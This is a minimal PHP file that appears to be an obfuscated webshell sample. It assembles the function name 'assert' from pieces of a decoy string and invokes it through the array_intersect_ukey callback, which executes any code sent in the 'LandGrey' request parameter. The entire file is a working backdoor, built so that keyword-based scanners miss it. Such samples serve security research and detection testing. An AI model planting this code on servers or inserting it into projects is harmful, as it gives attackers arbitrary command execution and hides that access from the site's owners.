<?php
/**
 * Noticed: (PHP 5 >= 5.4.0, PHP 7)
 *
 */
$password = "LandGrey";
$ch = explode(".","hello.ass.world.er.t");
array_intersect_ukey(array($_REQUEST[$password] => 1), array(1), $ch[1].$ch[3].$ch[4]);
?>
